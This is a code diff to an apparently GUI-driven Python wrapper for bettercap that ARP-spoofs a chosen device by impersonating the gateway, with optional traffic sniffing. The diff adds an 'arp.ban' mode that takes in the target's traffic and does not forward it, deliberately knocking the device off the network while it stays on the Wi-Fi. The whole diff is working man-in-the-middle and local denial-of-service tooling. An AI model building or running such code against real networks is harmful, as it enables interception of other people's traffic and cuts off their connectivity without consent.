@@ -57,10 +57,16 @@ def preflight() -> tuple[bool, str]:
 
 
 def build_eval(target_ip: str, full_duplex: bool = True,
-               sniff: bool = False) -> str:
+               sniff: bool = False, ban: bool = False) -> str:
     """Build the bettercap -eval command string that impersonates the gateway
     for `target_ip`. Raises ValueError without a target (safety: never spoof
-    the whole subnet by accident). bettercap discovers the gateway itself."""
+    the whole subnet by accident). bettercap discovers the gateway itself.
+
+    When `ban` is True, use bettercap's `arp.ban` instead of `arp.spoof`: the
+    target still sends its traffic to this machine, but we DON'T forward it on
+    to the router, so the device loses its connection while staying associated
+    to the Wi-Fi. (Plain `arp.spoof` keeps forwarding, so the device still
+    works and its traffic merely flows through us.)"""
     target_ip = (target_ip or "").strip()
     if not target_ip:
         raise ValueError("a target IP is required (refusing to spoof the whole network)")
@@ -68,7 +74,7 @@ def build_eval(target_ip: str, full_duplex: bool = True,
         f"set arp.spoof.targets {target_ip}",
         f"set arp.spoof.fullduplex {'true' if full_duplex else 'false'}",
         "net.probe on",
-        "arp.spoof on",
+        "arp.ban on" if ban else "arp.spoof on",
     ]
     if sniff:
         # Keep the summary readable: verbose events, limited to the target's
@@ -82,13 +88,14 @@ def build_eval(target_ip: str, full_duplex: bool = True,
 
 
 def build_argv(target_ip: str, iface: str | None = None,
-               full_duplex: bool = True, sniff: bool = False) -> list[str]:
+               full_duplex: bool = True, sniff: bool = False,
+               ban: bool = False) -> list[str]:
     """Full bettercap argv (without the privilege wrapper). Verifiable."""
     binary = bettercap_path() or "bettercap"
     argv = [binary]
     if iface:
         argv += ["-iface", iface]
-    argv += ["-eval", build_eval(target_ip, full_duplex, sniff)]
+    argv += ["-eval", build_eval(target_ip, full_duplex, sniff, ban)]
     return argv
 
 
@@ -119,6 +126,7 @@ class RouteSession:
         self.iface = iface
         self._proc: subprocess.Popen | None = None
         self._target = ""
+        self._ban = False  # True while cutting a device off (arp.ban, no forward)
         self._lock = threading.Lock()
         # Set while sniffing: the file bettercap writes its traffic summary to,
         # which the GUI tails. None when capture is off.
@@ -132,16 +140,18 @@ class RouteSession:
             return self._proc.poll() is None
 
     def start(self, target_ip: str, full_duplex: bool = True,
-              sniff: bool = False) -> tuple[bool, str]:
+              sniff: bool = False, ban: bool = False) -> tuple[bool, str]:
         ready, msg = preflight()
         if not ready:
             return False, msg
         if self.is_running():
-            return False, f"Already routing {self._target} through this machine."
+            verb = "cutting off" if self._ban else "routing"
+            return False, f"Already {verb} {self._target}."
         try:
-            argv = build_argv(target_ip, self.iface, full_duplex, sniff)
+            argv = build_argv(target_ip, self.iface, full_duplex, sniff, ban)
         except ValueError as e:
             return False, str(e)
+        self._ban = ban
 
         # When capturing, give bettercap a log file to write to and start it
         # empty so the GUI only sees this session's traffic.
@@ -176,6 +186,11 @@ class RouteSession:
         except Exception as e:
             return False, f"Could not start bettercap: {e}"
         tail = (" Traffic summary will appear below." if self.log_path else "")
+        if ban:
+            return True, (f"Cutting off {target_ip}: its traffic reaches this "
+                          f"machine but is NOT forwarded to the router, so the "
+                          f"device loses its connection while staying on the "
+                          f"Wi-Fi. Press Stop to restore it.{tail}")
         return True, (f"Routing {target_ip}'s traffic through this machine "
                       f"(impersonating the gateway). Press Stop to restore the "
                       f"network.{tail}")
@@ -210,9 +225,11 @@ class RouteSession:
         if not self._target:
             return True, "Nothing was running."
         target, self._target = self._target, ""
-        return True, (f"Stopped routing {target}. bettercap restored the ARP "
-                      f"tables; the network is back to normal."
-                      + ("" if killed else " (If traffic still routes, quit "
+        was_ban, self._ban = self._ban, False
+        verb = "cutting off" if was_ban else "routing"
+        return True, (f"Stopped {verb} {target}. bettercap restored the ARP "
+                      f"tables; the device's connection is back to normal."
+                      + ("" if killed else " (If it's still affected, quit "
                          "bettercap manually.)"))
 
 
